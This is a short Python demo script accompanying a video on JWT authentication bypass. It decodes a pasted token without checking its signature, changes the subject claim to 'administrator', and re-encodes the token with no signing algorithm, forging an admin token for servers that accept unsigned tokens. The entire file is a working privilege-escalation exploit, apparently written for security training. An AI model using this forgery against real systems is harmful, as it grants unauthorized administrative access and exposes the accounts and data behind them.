# Demo script for 'JWT Authentication Bypass via Flawed Signature Verification' video: https://youtu.be/rEUoU6OYH_g
import jwt

# Paste JWT token here
token = 'INSERT_TOKEN_HERE'

# Decode the token (without verifying)
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token: {decoded_token}\n")

# Modify the token (JWT manipulation)
decoded_token['sub'] = 'administrator'
print(f"Modified payload: {decoded_token}\n")

# Generate a new token with the modified payload (re-encode)
# Re-encode the JWT with None algorithm
modified_token = jwt.encode(decoded_token, None, algorithm=None)
print(f"Modified token: {modified_token}\n")